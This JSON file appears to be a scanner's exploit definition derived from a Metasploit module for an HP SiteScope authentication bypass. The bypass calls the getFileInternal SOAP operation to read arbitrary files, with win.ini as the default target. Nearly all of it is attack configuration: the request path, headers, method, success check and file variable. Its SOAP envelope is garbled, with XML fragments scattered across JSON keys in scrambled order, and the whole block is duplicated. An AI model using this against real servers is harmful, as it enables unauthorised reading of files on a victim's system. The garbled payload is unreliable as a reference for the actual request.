{
   "path" : "__\\@URI__services/APISiteScopeImpl?",
   "type" : "MSF",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "informations" : {
      "TITLE" : "HP SiteScope SOAP Call getFileInternal Remote File Access",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "<wsns0:Envelope\r\n" : "xmlns:wsns1=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "xsi:type=\\'xsd:string\\'\r\n" : "xmlns:xsi=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n",
            "PATH" : "services/APISiteScopeImpl",
            "METHOD" : "POST",
            ">\r\n" : "<in0\r\n",
            "></in1>\r\n" : "</impl:getFileInternal>\r\n",
            "HEADERS" : {
               "Content-Type" : "text/xml; charset=UTF-8",
               "SOAPAction" : "\"\""
            },
            "PAYLOAD" : "<?xml version=\\'1.0\\' encoding=\\'UTF-8\\'?>\r\n",
            "TEXT" : "Sending Exploit #1 Request : [POST] /services/APISiteScopeImpl",
            "xmlns:xsi=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n" : "></in0>\r\n",
            "<in1\r\n" : "xsi:nil=\\'true\\'\r\n",
            "xsi:nil=\\'true\\'\r\n" : "xsi:type=\\'xsd:string\\'\r\n",
            "wsns0:encodingStyle=\\'http://schemas.xmlsoap.org/soap/encoding/\\'\r\n" : ">\r\n",
            "<impl:getFileInternal\r\n" : "xmlns:impl=\\'http://Api.freshtech.COM\\'\r\n",
            "</wsns0:Body>\r\n" : "</wsns0:Envelope>",
            "xmlns:xsd=\\'http://www.w3.org/2001/XMLSchema\\'\r\n" : "xmlns:wsns0=\\'http://schemas.xmlsoap.org/soap/envelope/\\'\r\n"
         },
         "EXPLOIT2" : {
            "PAYLOAD" : "",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "TEXT" : "Sending Exploit #2 Request : [GET] ",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "",
            "METHOD" : "GET"
         }
      },
      "name" : "HpSitescopeGetfileinternalFileaccess",
      "OSVDB" : 85119,
      "PAYLOAD" : "",
      "DESCRIPTION" : "\n\n          This module exploits an authentication bypass vulnerability in HP SiteScope to\n\n        retrieve an arbitrary file from the remote server. It is accomplished by calling\n\n        the getFileInternal operation available through the APISiteScopeImpl AXIS service.\n\n        This module has been successfully tested on HP SiteScope 11.20 over Windows 2003\n\n        SP2 and Linux Centos 6.3.\n\n      ",
      "VARIABLES" : {
         "PATH" : {
            "VALUE" : "/SiteScope/",
            "DESCRIPTION" : "Path to SiteScope"
         },
         "RFILE" : {
            "DESCRIPTION" : "Remote File",
            "VALUE" : "c:\\\\windows\\\\win.ini"
         },
         "HOST_NAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         }
      },
      "MSF_MODULE" : "hp_sitescope_getfileinternal_fileaccess",
      "PATHS" : [
         "__\\@URI__services/APISiteScopeImpl",
         "__\\@URI__services/APISiteScopeImpl",
         "SiteScope/"
      ],
      "TYPE" : "MSF",
      "PLATFORM" : "SCANNER",
      "METHOD" : "POST",
      "PATH" : "__\\@URI__services/APISiteScopeImpl?"
   },
   "detection" : {},
   "title" : "HP SiteScope SOAP Call getFileInternal Remote File Access",
   "variables" : {
      "HOST_NAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PATH" : {
         "VALUE" : "/SiteScope/",
         "DESCRIPTION" : "Path to SiteScope"
      },
      "RFILE" : {
         "DESCRIPTION" : "Remote File",
         "VALUE" : "c:\\\\windows\\\\win.ini"
      }
   },
   "payload" : "",
   "platform" : "SCANNER",
   "method" : "POST",
   "description" : "\n\n          This module exploits an authentication bypass vulnerability in HP SiteScope to\n\n        retrieve an arbitrary file from the remote server. It is accomplished by calling\n\n        the getFileInternal operation available through the APISiteScopeImpl AXIS service.\n\n        This module has been successfully tested on HP SiteScope 11.20 over Windows 2003\n\n        SP2 and Linux Centos 6.3.\n\n      ",
   "requests" : {
      "EXPLOIT2" : {
         "PAYLOAD" : "",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "TEXT" : "Sending Exploit #2 Request : [GET] ",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "",
         "METHOD" : "GET"
      },
      "EXPLOIT1" : {
         "<wsns0:Envelope\r\n" : "xmlns:wsns1=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "xsi:type=\\'xsd:string\\'\r\n" : "xmlns:xsi=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n",
         "PATH" : "services/APISiteScopeImpl",
         "METHOD" : "POST",
         ">\r\n" : "<in0\r\n",
         "></in1>\r\n" : "</impl:getFileInternal>\r\n",
         "HEADERS" : {
            "Content-Type" : "text/xml; charset=UTF-8",
            "SOAPAction" : "\"\""
         },
         "PAYLOAD" : "<?xml version=\\'1.0\\' encoding=\\'UTF-8\\'?>\r\n",
         "TEXT" : "Sending Exploit #1 Request : [POST] /services/APISiteScopeImpl",
         "xmlns:xsi=\\'http://www.w3.org/2001/XMLSchema-instance\\'\r\n" : "></in0>\r\n",
         "<in1\r\n" : "xsi:nil=\\'true\\'\r\n",
         "xsi:nil=\\'true\\'\r\n" : "xsi:type=\\'xsd:string\\'\r\n",
         "wsns0:encodingStyle=\\'http://schemas.xmlsoap.org/soap/encoding/\\'\r\n" : ">\r\n",
         "<impl:getFileInternal\r\n" : "xmlns:impl=\\'http://Api.freshtech.COM\\'\r\n",
         "</wsns0:Body>\r\n" : "</wsns0:Envelope>",
         "xmlns:xsd=\\'http://www.w3.org/2001/XMLSchema\\'\r\n" : "xmlns:wsns0=\\'http://schemas.xmlsoap.org/soap/envelope/\\'\r\n"
      }
   },
   "osvdb" : 85119,
   "paths" : [
      "__\\@URI__services/APISiteScopeImpl",
      "__\\@URI__services/APISiteScopeImpl",
      "SiteScope/"
   ],
   "name" : "HpSitescopeGetfileinternalFileaccess",
   "msf_module" : "hp_sitescope_getfileinternal_fileaccess"
}
